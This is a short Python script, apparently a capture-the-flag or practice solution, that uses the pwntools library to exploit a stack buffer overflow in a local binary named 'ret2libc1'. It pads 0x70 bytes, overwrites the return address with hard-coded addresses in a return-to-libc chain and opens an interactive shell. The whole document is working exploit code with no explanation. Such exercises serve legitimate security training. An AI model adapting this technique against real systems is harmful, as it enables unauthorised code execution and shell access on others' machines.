from pwn import *

addr1=0x08048460
addr2=0x08048720
offset=0x70

payload=b'A'*offset+p32(addr1)+p32(0xcccccccc)+p32(addr2)
sh=process('./ret2libc1')
sh.sendline(payload)
sh.interactive()
